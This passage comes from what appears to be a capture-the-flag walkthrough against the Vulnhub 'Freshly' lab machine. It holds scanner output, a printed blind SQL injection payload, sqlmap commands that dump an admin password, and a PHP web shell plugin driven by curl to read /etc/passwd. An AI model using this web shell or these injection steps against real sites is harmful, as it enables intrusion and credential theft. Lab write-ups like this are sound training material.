<span class="go">    Reference: http://klikki.fi/adv/yoast_analytics2.html</span>
<span class="go">    Reference: http://osvdb.org/121068</span>
<span class="go">[i] Fixed in: 5.4</span>

<span class="go">[+] Name: jetpack - v3.3.1</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/jetpack/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/jetpack/readme.txt</span>

<span class="go">[!] Title: Jetpack by WordPress.com 3.0-3.4.2 - Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7915</span>
<span class="go">    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html</span>
<span class="go">    Reference: https://jetpack.me/2015/04/20/jetpack-3-4-3-coordinated-security-update/</span>
<span class="go">    Reference: http://osvdb.org/121066</span>
<span class="go">[i] Fixed in: 3.4.3</span>

<span class="go">[!] Title: Jetpack &lt;= 3.5.2 - DOM Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7964</span>
<span class="go">    Reference: https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html</span>
<span class="go">[i] Fixed in: 3.5.3</span>

<span class="go">[+] Name: proplayer - v4.7.9.1</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/proplayer/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/proplayer/readme.txt</span>

<span class="go">[!] Title: ProPlayer 4.7.9.1 - SQL Injection</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/6912</span>
<span class="go">    Reference: http://osvdb.org/93564</span>
<span class="go">    Reference: http://www.exploit-db.com/exploits/25605/</span>

<span class="go">[+] Name: wptouch - v3.6.6</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/plugins/wptouch/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/plugins/wptouch/readme.txt</span>

<span class="go">[!] Title: WPtouch &lt;= 3.6.6 - Unvalidated Open Redirect</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7837</span>
<span class="go">    Reference: https://wordpress.org/plugins/wptouch/changelog/</span>
<span class="go">[i] Fixed in: 3.7</span>

<span class="go">[!] Title: WPtouch Mobile Plugin &lt;= 3.7.5.3 - Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7920</span>
<span class="go">    Reference: https://blog.sucuri.net/2015/04/security-advisory-xss-vulnerability-affecting-multiple-wordpress-plugins.html</span>
<span class="go">    Reference: http://osvdb.org/121073</span>
<span class="go">[i] Fixed in: 3.7.6</span>

<span class="go">[+] Enumerating installed themes (only vulnerable ones) ...</span>



<span class="go">  : |==========================================================================|</span>

<span class="hll"><span class="go">[+] We found 1 themes:</span>
</span>
<span class="go">[+] Name: twentyfifteen - v1.0</span>
<span class="go"> |  Location: http://192.168.1.103:8080/wordpress/wp-content/themes/twentyfifteen/</span>
<span class="go"> |  Readme: http://192.168.1.103:8080/wordpress/wp-content/themes/twentyfifteen/readme.txt</span>
<span class="go"> |  Style URL: http://192.168.1.103:8080/wordpress/wp-content/themes/twentyfifteen/style.css</span>
<span class="go"> |  Theme Name: Twenty Fifteen</span>
<span class="go"> |  Theme URI: https://wordpress.org/themes/twentyfifteen</span>
<span class="go"> |  Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen&#39;s simple,...</span>
<span class="go"> |  Author: the WordPress team</span>
<span class="go"> |  Author URI: https://wordpress.org/</span>

<span class="go">[!] Title: Twenty Fifteen Theme &lt;= 1.1 - DOM Cross-Site Scripting (XSS)</span>
<span class="go">    Reference: https://wpvulndb.com/vulnerabilities/7965</span>
<span class="go">    Reference: https://blog.sucuri.net/2015/05/jetpack-and-twentyfifteen-vulnerable-to-dom-based-xss-millions-of-wordpress-websites-affected-millions-of-wordpress-websites-affected.html</span>
<span class="go">[i] Fixed in: 1.2</span>

<span class="go">[+] Enumerating timthumb files ...</span>



<span class="go">  : |==========================================================================|</span>

<span class="hll"><span class="go">[+] No timthumb files found</span>
</span>
<span class="go">[+] Enumerating usernames ...</span>
<span class="hll"><span class="go">[+] Identified the following 1 user/s:</span>
</span><span class="hll"><span class="go">    +----+-------+-------+</span>
</span><span class="hll"><span class="go">    | Id | Login | Name  |</span>
</span><span class="hll"><span class="go">    +----+-------+-------+</span>
</span><span class="hll"><span class="go">    | 1  | admin | admin |</span>
</span><span class="hll"><span class="go">    +----+-------+-------+</span>
</span><span class="go">[!] Default first WordPress username &#39;admin&#39; is still used</span>

<span class="go">[+] Finished: Tue May 12 23:16:49 2015</span>
<span class="go">[+] Requests Done: 3989</span>
<span class="go">[+] Memory used: 14.184 MB</span>
<span class="go">[+] Elapsed time: 00:06:22</span>
</pre></div>
</div>
<p>None of the exploits appeared to be an easy, relevant source of exploit.</p>
</div>
<div class="section" id="spidering-the-web-site">
<h3>3.18.2.5. Spidering the web site<a class="headerlink" href="#spidering-the-web-site" title="Permalink to this headline">¶</a></h3>
<p>Next we look for any non-navigable web site files/directories. These tools exist on Kali Linux and could be used: GUI <strong class="program">owasp-zap</strong>, command line <strong class="program">dirb</strong>, command line <strong class="program">skipfish</strong> with html output, and command line <strong class="program">nikto</strong>. Here are runs of <strong class="program">dirb</strong>, <strong class="program">skipfish</strong>, and <strong class="program">nikto</strong>. We stop at looking at <a class="reference external" href="http://$T/">http://$T/</a> and don’t recurse due to finding <code class="file docutils literal"><span class="pre">login.php</span></code> quickly.</p>
<div class="section" id="dirb">
<h4>3.18.2.5.1. <strong class="program">dirb</strong><a class="headerlink" href="#dirb" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/dirb
dirb  http://<span class="nv">$T</span>/ -o dirb_html_php -X <span class="s2">&quot;.html,.php&quot;</span>
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/dirb$</span> dirb  http://<span class="nv">$T</span>/ -o dirb_html_php -X <span class="s2">&quot;.html,.php&quot;</span>
</span>
<span class="go">-----------------</span>
<span class="go">DIRB v2.21</span>
<span class="go">By The Dark Raver</span>
<span class="go">-----------------</span>

<span class="go">OUTPUT_FILE: dirb_html_php</span>
<span class="go">START_TIME: Mon May  4 13:22:29 2015</span>
<span class="hll"><span class="go">URL_BASE: http://192.168.1.103/</span>
</span><span class="hll"><span class="go">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span>
</span><span class="hll"><span class="go">EXTENSIONS_LIST: (.html,.php) | (.html)(.php) [NUM = 2]</span>
</span>
<span class="go">-----------------</span>

<span class="go">GENERATED WORDS: 4592</span>

<span class="go">---- Scanning URL: http://192.168.1.103/ ----</span>
<span class="go">+ http://192.168.1.103/index.html (CODE:200|SIZE:47)</span>
<span class="hll"><span class="go">+ http://192.168.1.103/login.php (CODE:200|SIZE:276)</span>
</span>
<span class="go">-----------------</span>
<span class="go">DOWNLOADED: 9184 - FOUND: 2</span>
</pre></div>
</div>
</div>
<div class="section" id="skipfish">
<h4>3.18.2.5.2. <strong class="program">skipfish</strong><a class="headerlink" href="#skipfish" title="Permalink to this headline">¶</a></h4>
<p>Trying <strong class="program">skipfish</strong> took more work to speed it up (to exclude some subdirectories). To see what it’s scanning hit the space bar while it runs:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/skipfish
<span class="nv">MINIMAL</span><span class="o">=</span>/usr/share/skipfish/dictionaries/minimal.wl
<span class="nv">EXT</span><span class="o">=</span>/usr/share/skipfish/dictionaries/extensions-only.wl
<span class="nv">DICT</span><span class="o">=</span><span class="s2">&quot;-S </span><span class="nv">$MINIMAL</span><span class="s2"> -S </span><span class="nv">$EXT</span><span class="s2">&quot;</span>
<span class="nv">SKIP</span><span class="o">=</span><span class="s2">&quot;-X /phpmyadmin -X /icons -X /javascript&quot;</span>
<span class="nv">REPORT</span><span class="o">=</span>skipfish_minimal
rm -rf <span class="nv">$REPORT</span>
skipfish <span class="nv">$SKIP</span> <span class="nv">$DICT</span> -L -o skipfish_minimal http://<span class="nv">$T</span>
</pre></div>
</div>
<p>Running this produces an html report accessible from <code class="file docutils literal"><span class="pre">skipfish_minimal/index.html</span></code> (showing <code class="file docutils literal"><span class="pre">login.php</span></code>).</p>
</div>
<div class="section" id="nikto">
<h4>3.18.2.5.3. <strong class="program">nikto</strong><a class="headerlink" href="#nikto" title="Permalink to this headline">¶</a></h4>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
nikto -output nikto_80.txt -host <span class="nv">$T</span>
nikto -output nikto_8080.txt -host <span class="nv">$T</span> -port <span class="m">8080</span>
nikto -output nikto_443.txt -host <span class="nv">$T</span> -port <span class="m">443</span>
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nikto$</span> nikto -output nikto_80.txt -host <span class="nv">$T</span>
</span><span class="go">- Nikto v2.1.6</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="hll"><span class="go">+ Target IP:          192.168.1.103</span>
</span><span class="hll"><span class="go">+ Target Hostname:    192.168.1.103</span>
</span><span class="hll"><span class="go">+ Target Port:        80</span>
</span><span class="go">+ Start Time:         2015-05-04 22:02:45 (GMT-7)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="hll"><span class="go">+ Server: Apache/2.4.7 (Ubuntu)</span>
</span><span class="go">+ Server leaks inodes via ETags, header found with file /, fields: 0x2f 0x50f4228b8016c</span>
<span class="go">+ The anti-clickjacking X-Frame-Options header is not present.</span>
<span class="go">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span>
<span class="go">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS</span>
<span class="go">+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.5</span>
<span class="go">+ Uncommon header &#39;x-webkit-csp&#39; found, with contents: default-src &#39;self&#39; ;script-src &#39;self&#39;  &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;;style-src &#39;self&#39; &#39;unsafe-inline&#39;;img-src &#39;self&#39; data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;</span>
<span class="go">+ Uncommon header &#39;x-ob_mode&#39; found, with contents: 0</span>
<span class="go">+ Uncommon header &#39;x-content-security-policy&#39; found, with contents: default-src &#39;self&#39; ;options inline-script eval-script;img-src &#39;self&#39; data:  *.tile.openstreetmap.org *.tile.opencyclemap.org;</span>
<span class="go">+ OSVDB-3233: /icons/README: Apache default file found.</span>
<span class="hll"><span class="go">+ /login.php: Admin login page/section found.</span>
</span><span class="hll"><span class="go">+ /phpmyadmin/: phpMyAdmin directory found</span>
</span><span class="go">+ 6744 requests: 0 error(s) and 10 item(s) reported on remote host</span>
<span class="go">+ End Time:           2015-05-04 22:03:02 (GMT-7) (17 seconds)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ 1 host(s) tested</span>
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nikto$</span> nikto -output nikto_8080.txt -host <span class="nv">$T</span> -port <span class="m">8080</span>
</span><span class="go">- Nikto v2.1.6</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="hll"><span class="go">+ Target IP:          192.168.1.103</span>
</span><span class="hll"><span class="go">+ Target Hostname:    192.168.1.103</span>
</span><span class="hll"><span class="go">+ Target Port:        8080</span>
</span><span class="go">+ Start Time:         2015-05-04 22:03:11 (GMT-7)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Server: Apache</span>
<span class="go">+ IP address found in the &#39;x-mod-pagespeed&#39; header. The IP is &quot;1.7.30.4&quot;.</span>
<span class="go">+ Uncommon header &#39;x-mod-pagespeed&#39; found, with contents: 1.7.30.4-</span>
<span class="go">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span>
<span class="go">+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4fbf4f262dd00</span>
<span class="go">+ OSVDB-3268: /img/: Directory indexing found.</span>
<span class="go">+ OSVDB-3092: /img/: This might be interesting...</span>
<span class="go">+ Cookie PHPSESSID created without the httponly flag</span>
<span class="go">+ Retrieved x-powered-by header: PHP/5.4.35</span>
<span class="go">+ Uncommon header &#39;link&#39; found, with contents: &lt;http://192.168.1.103:8080/wordpress/&gt;; rel=shortlink</span>
<span class="hll"><span class="go">+ /wordpress/: A Wordpress installation was found.</span>
</span><span class="go">+ 6606 requests: 0 error(s) and 9 item(s) reported on remote host</span>
<span class="go">+ End Time:           2015-05-04 22:03:30 (GMT-7) (19 seconds)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ 1 host(s) tested</span>
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/nikto$</span> nikto -output nikto_443.txt -host <span class="nv">$T</span> -port <span class="m">443</span>
</span><span class="go">- Nikto v2.1.6</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="hll"><span class="go">+ Target IP:          192.168.1.103</span>
</span><span class="hll"><span class="go">+ Target Hostname:    192.168.1.103</span>
</span><span class="hll"><span class="go">+ Target Port:        443</span>
</span><span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ SSL Info:        Subject: /CN=www.example.com</span>
<span class="go">                   Ciphers: ECDHE-RSA-AES256-GCM-SHA384</span>
<span class="go">                   Issuer:  /CN=www.example.com</span>
<span class="go">+ Start Time:         2015-05-04 22:03:36 (GMT-7)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ Server: Apache</span>
<span class="go">+ IP address found in the &#39;x-mod-pagespeed&#39; header. The IP is &quot;1.7.30.4&quot;.</span>
<span class="go">+ Uncommon header &#39;x-mod-pagespeed&#39; found, with contents: 1.7.30.4-</span>
<span class="go">+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.</span>
<span class="go">+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)</span>
<span class="go">+ Hostname &#39;192.168.1.103&#39; does not match certificate&#39;s CN &#39;www.example.com&#39;</span>
<span class="go">+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0x47e 0x4fbf4f262dd00</span>
<span class="go">+ OSVDB-3268: /img/: Directory indexing found.</span>
<span class="go">+ OSVDB-3092: /img/: This might be interesting...</span>
<span class="go">+ Cookie PHPSESSID created without the secure flag</span>
<span class="go">+ Cookie PHPSESSID created without the httponly flag</span>
<span class="go">+ Cookie Cart66DBSID created without the secure flag</span>
<span class="go">+ Retrieved x-powered-by header: PHP/5.4.35</span>
<span class="go">+ Uncommon header &#39;link&#39; found, with contents: &lt;https://192.168.1.103:443/wordpress/&gt;; rel=shortlink</span>
<span class="hll"><span class="go">+ /wordpress/: A Wordpress installation was found.</span>
</span><span class="go">+ 6604 requests: 0 error(s) and 13 item(s) reported on remote host</span>
<span class="go">+ End Time:           2015-05-04 22:05:10 (GMT-7) (94 seconds)</span>
<span class="go">---------------------------------------------------------------------------</span>
<span class="go">+ 1 host(s) tested</span>
</pre></div>
</div>
</div>
<div class="section" id="in-summary">
<h4>3.18.2.5.4. In summary<a class="headerlink" href="#in-summary" title="Permalink to this headline">¶</a></h4>
<p>All these reports show a login form at <a class="reference external" href="http://$T/login.php">http://$T/login.php</a> which we will subject to <strong class="program">sqlmap</strong> analysis.</p>
</div>
</div>
<div class="section" id="sqlmap-login-php">
<h3>3.18.2.6. <strong class="program">sqlmap</strong> <code class="file docutils literal"><span class="pre">login.php</span></code><a class="headerlink" href="#sqlmap-login-php" title="Permalink to this headline">¶</a></h3>
<p>Looking at the login.php form shows user/password fields which we feed into sqlmap:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ cd $</span>JOB/sqlmap
</span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> curl --silent --remote-name http://<span class="nv">$T</span>/login.php
</span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> cat login.php
</span>
<span class="go">&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span>
<span class="go">&lt;table width=&quot;50%&quot;&gt;</span>
<span class="go">        &lt;tr&gt;</span>
<span class="go">                &lt;td&gt;User&lt;/td&gt;</span>
<span class="hll"><span class="go">                &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;/td&gt;</span>
</span><span class="go">        &lt;/tr&gt;</span>
<span class="go">        &lt;tr&gt;</span>
<span class="go">                &lt;td&gt;Password&lt;/td&gt;</span>
<span class="hll"><span class="go">                &lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;/td&gt;</span>
</span><span class="go">        &lt;/tr&gt;</span>
<span class="go">        &lt;/table&gt;</span>
<span class="hll"><span class="go">                &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;s&quot;&gt;</span>
</span><span class="go">        &lt;/form&gt;</span>
</pre></div>
</div>
<p>Start with “–dbs” to find if sql injection is possible the databases, then progress to enumerating user accounts for wordpress. It’s quite slow due to being a blink sql injection.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="nv">URL</span><span class="o">=</span>http://<span class="nv">$T</span>/login.php
sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
    --output-dir <span class="nv">$PWD</span>/sqlmap_login --dbs
</pre></div>
</div>
<p>Running this gives us:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.103
<span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$ URL=http://$</span>T/login.php
<span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
</span><span class="hll">    --output-dir <span class="nv">$PWD</span>/sqlmap_login --dbs
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">sqlmap identified the following injection points with a total of 114 HTTP(s) requests:</span>
</span><span class="go">---</span>
<span class="go">Parameter: user (POST)</span>
<span class="go">    Type: AND/OR time-based blind</span>
<span class="go">    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</span>
<span class="go">    Payload: user=LDRL&#39; AND (SELECT * FROM (SELECT(SLEEP(5)))lPIC) AND &#39;KrbC&#39;=&#39;KrbC&amp;password=&amp;s=Submit</span>
<span class="go">---</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">back-end DBMS: MySQL 5.0.12</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">available databases [7]:</span>
</span><span class="hll"><span class="go">[*] information_schema</span>
</span><span class="hll"><span class="go">[*] login</span>
</span><span class="hll"><span class="go">[*] mysql</span>
</span><span class="hll"><span class="go">[*] performance_schema</span>
</span><span class="hll"><span class="go">[*] phpmyadmin</span>
</span><span class="hll"><span class="go">[*] users</span>
</span><span class="hll"><span class="go">[*] wordpress8080</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>Let’s go after the wordpress8080 MySQL database:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
    --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  --tables
</pre></div>
</div>
<p>Running this shows database wordpress8080 has only a users table:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
</span>    --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  --tables
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>

<span class="hll"><span class="go">Database: wordpress8080</span>
</span><span class="hll"><span class="go">[1 table]</span>
</span><span class="hll"><span class="go">+-------+</span>
</span><span class="hll"><span class="go">| users |</span>
</span><span class="hll"><span class="go">+-------+</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>So let’s dump the users table:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
    --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  -T users --dump
</pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/sqlmap$</span> sqlmap -u <span class="s2">&quot;</span><span class="nv">$URL</span><span class="s2">&quot;</span> --random-agent --forms --batch <span class="se">\</span>
</span><span class="hll">    --output-dir <span class="nv">$PWD</span>/sqlmap_login -D wordpress8080  -T users --dump
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="hll"><span class="go">Database: wordpress8080</span>
</span><span class="hll"><span class="go">Table: users</span>
</span><span class="hll"><span class="go">[1 entry]</span>
</span><span class="hll"><span class="go">+----------+---------------------+</span>
</span><span class="hll"><span class="go">| username | password            |</span>
</span><span class="hll"><span class="go">+----------+---------------------+</span>
</span><span class="hll"><span class="go">| admin    | SuperSecretPassword |</span>
</span><span class="hll"><span class="go">+----------+---------------------+</span>
</span><span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
</pre></div>
</div>
<p>So now we can log into the wordpress site <a class="reference external" href="http://$T:8080/wordpress/wp-login.php">http://$T:8080/wordpress/wp-login.php</a> using admin/SuperSecretPassword.</p>
</div>
</div>
<div class="section" id="the-exploit">
<h2>3.18.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
<div class="section" id="insert-php-plugin">
<h3>3.18.3.1. Insert PHP Plugin<a class="headerlink" href="#insert-php-plugin" title="Permalink to this headline">¶</a></h3>
<p>One direct way to exploit WordPress is to add &amp; activate the plugin <a class="reference external" href="https://wordpress.org/plugins/insert-php/">Insert PHP</a> via the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> <span class="menuselection">Plugins ‣ Add new ‣ Upload Plugin ‣ Browse ‣ Install now ‣ Activate Plugin</span> menu item. Once you have that, <span class="menuselection">Pages ‣ Add new</span> to add a new page with content:</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="x">[insert_php]</span>
<span class="x">passthru(&#39;id; echo &quot;\n&quot;; cat /etc/passwd;&#39;);</span>
<span class="x">[/insert_php]</span>
</pre></div>
</div>
<p>Navigating to the page will give you:</p>
<div class="highlight-text"><div class="highlight"><pre><span></span>uid=1(daemon) gid=1(daemon) groups=1(daemon)

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
user:x:1000:1000:user,,,:/home/user:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
candycane:x:1001:1001::/home/candycane:
<span class="hll"># YOU STOLE MY SECRET FILE!
</span><span class="hll"># SECRET = “NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!”
</span></pre></div>
</div>
</div>
<div class="section" id="create-your-own-wordpress-plugin">
<h3>3.18.3.2. Create your own WordPress plugin<a class="headerlink" href="#create-your-own-wordpress-plugin" title="Permalink to this headline">¶</a></h3>
<p>An alternative approach is to follow <a class="reference external" href="http://dook.biz/2015/04/vulnhub-tophatsec-freshly-writeup/">Vulnhub – (TopHatSec) Freshly Writeup</a> and create your own WordPress plugin. This has the advantage of password-less access to a page allowing execution of arbitrary shell commands. This author personally likes this one the best.</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$JOB</span>/exploit
cat &gt; exploit-plugin.php <span class="s">&lt;&lt;EOF</span>
<span class="s">&lt;?php</span>
<span class="s"> /*</span>
<span class="s"> Plugin Name: Execute arbitrary command line program</span>
<span class="s"> Plugin URI: www.example.com</span>
<span class="s"> Description: Makes your WordPress site vulnerable.</span>
<span class="s"> Author: pentest-meetup</span>
<span class="s"> Version: 1.0</span>
<span class="s"> Author URI: www.example.com</span>
<span class="s"> */</span>
<span class="s"> passthru(\$_GET[&quot;cmd&quot;]);</span>
<span class="s">?&gt;</span>
<span class="s">zip -r exploit-plugin exploit-plugin.php</span>
<span class="s">EOF</span>
</pre></div>
</div>
<p>Add &amp; activate the plugin via the <a class="reference external" href="http://$T:8080/wordpress/wp-admin/">http://$T:8080/wordpress/wp-admin/</a> <span class="menuselection">Plugins ‣ Add new ‣ Upload Plugin ‣ Browse ‣ Install now ‣ Activate Plugin</span> menu item. To execute arbitrary commands:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent http://<span class="nv">$T</span>:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd<span class="o">=</span>cat%20/etc/passwd
</pre></div>
</div>
<p>Running this gives:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="hll"><span class="gp">hacker@kali:~/local/pentest/phouse/freshly/exploit$</span> curl --silent http://<span class="nv">$T</span>:8080/wordpress/wp-content/plugins/exploit-plugin/exploit-plugin.php?cmd<span class="o">=</span>cat%20/etc/passwd
</span><span class="go">root:x:0:0:root:/root:/bin/bash</span>
<span class="go">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span>
<span class="go">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span>
<span class="go">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span>
<span class="go">sync:x:4:65534:sync:/bin:/bin/sync</span>
<span class="go">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span>
<span class="go">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span>
<span class="go">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span>
<span class="go">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span>
<span class="go">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span>
<span class="go">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span>
<span class="go">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span>
<span class="go">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span>
<span class="go">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span>
<span class="go">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span>
<span class="go">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span>
<span class="go">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span>
<span class="go">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span>
<span class="go">libuuid:x:100:101::/var/lib/libuuid:</span>
<span class="go">syslog:x:101:104::/home/syslog:/bin/false</span>
<span class="go">messagebus:x:102:105::/var/run/dbus:/bin/false</span>
<span class="go">user:x:1000:1000:user,,,:/home/user:/bin/bash</span>
<span class="go">mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false</span>
<span class="go">candycane:x:1001:1001::/home/candycane:</span>
<span class="hll"><span class="gp">#</span> YOU STOLE MY SECRET FILE!
</span><span class="hll"><span class="gp">#</span> <span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">&quot;NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!&quot;</span>
</span></pre></div>
</div>
</div>
<div class="section" id="put-php-in-footer-php">
<h3>3.18.3.3. Put php in footer.php<a class="headerlink" href="#put-php-in-footer-php" title="Permalink to this headline">¶</a></h3>
